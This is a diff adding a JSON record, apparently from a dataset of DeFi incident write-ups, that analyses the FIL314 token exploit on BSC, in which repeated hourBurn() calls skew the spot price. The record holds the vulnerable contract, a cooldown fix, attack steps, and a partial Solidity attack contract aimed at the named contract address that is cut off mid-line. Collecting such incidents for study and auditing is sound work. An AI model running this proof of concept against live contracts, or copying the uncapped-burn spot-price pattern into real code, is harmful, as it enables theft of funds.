@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-04-XX_FIL314_HourBurnPriceManipulation",
+ "source_file": "2024/2024-04-XX_FIL314_HourBurnPriceManipulation.md",
+ "title": "FIL314 — hourBurn Repeated-Call Token Price Manipulation Analysis",
+ "date": "2024-04-01",
+ "protocol": "FIL314",
+ "chain": "BSC",
+ "loss_raw": "~14 BNB",
+ "loss_usd": null,
+ "root_cause": "Repeatedly calling `hourBurn()` ~6,000 times burns the token supply, distorting the spot price calculation in `getAmountOut()`, enabling excessive BNB withdrawal via subsequent `transfer()` calls",
+ "attack_tx": null,
+ "vulnerable_contract": "FIL314 0xE8A290c6",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no hourBurn cooldown/limit + getAmountOut spot dependency\ncontract FIL314 {\n    uint256 public totalSupply;\n\n    // No cooldown — anyone can call repeatedly\n    function hourBurn() external {\n        uint256 burnAmount = totalSupply / 1000;\n        _burn(address(this), burnAmount);\n    }\n\n    // Spot reserve-based price — manipulable\n    function getAmountOut(uint256 value, bool _buy) public view returns (uint256) {\n        uint256 tokenReserve = balanceOf(address(this));\n        uint256 ethReserve   = address(this).balance;\n        if (_buy) {\n            return (value * tokenReserve) / (ethReserve + value);\n        } else {\n            return (value * ethReserve) / (tokenReserve + value);\n            // ← BNB output increases as tokenReserve decreases\n        }\n    }\n\n    function transfer(address to, uint256 value) external override returns (bool) {\n        if (to == address(this)) {\n            // Token → BNB sell\n            uint256 ethAmount = getAmountOut(value, false);\n            _transfer(msg.sender, address(this), value);\n            payable(msg.sender).transfer(ethAmount);\n        }\n        // ...\n    }\n}\n\n//",
+  "// File: FIL314_decompiled.sol\ncontract FIL314 {\n    function hourBurn() external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: hourBurn cooldown + call cap\nmapping(address => uint256) public lastHourBurn;\n\nfunction hourBurn() external {\n    require(block.timestamp >= lastHourBurn[msg.sender] + 1 hours, \"cooldown\");\n    lastHourBurn[msg.sender] = block.timestamp;\n    uint256 burnAmount = totalSupply / 1000;\n    require(burnAmount <= MAX_BURN_PER_CALL, \"burn limit exceeded\");\n    _burn(address(this), burnAmount);\n}"
+ ],
+ "steps": [
+  "→ [1] Send 0.05 BNB → Buy FIL314 tokens",
+  "→ [2] Call hourBurn() ~6,000 times",
+  "→ [3] Confirm manipulated price via getAmountOut()",
+  "→ [4] transfer(FIL314Contract, tokenAmount)",
+  "→ [5] ~14 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Send 0.05 BNB → Buy FIL314 tokens\n  │\n  ├─→ [2] Call hourBurn() ~6,000 times\n  │         └─ tokenReserve decreases significantly\n  │         └─ getAmountOut(sell) return value increases\n  │\n  ├─→ [3] Confirm manipulated price via getAmountOut()\n  │\n  ├─→ [4] transfer(FIL314Contract, tokenAmount)\n  │         └─ Receive BNB at manipulated price\n  │\n  └─→ [5] ~14 BNB profit",
+  "interface IFIL314 {\n    function hourBurn() external;\n    function getAmountOut(uint256 value, bool _buy) external view returns (uint256);\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract AttackContract {\n    IFIL314 constant fil = IFIL314(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF);\n\n    function testExploit() external payable {\n        // [1] Buy FIL314 tokens with 0.05 BNB\n        (bool ok,) = address(fil).call{value: 0.05 ether}(\"\");\n        require(ok);\n\n        // [2] hourBurn x6000 → reduce tokenReserve\n        for (uint i = 0; i < 6000; i++) {\n            fil.hourBurn();\n        }\n\n        // [3] Sell at manipulated price for BNB\n        uint256 tokenBal = IERC20(address(fil)).balanceOf(address(this));\n        uint256 ethOut = fil.getAmountOut(t"
+ ]
+}
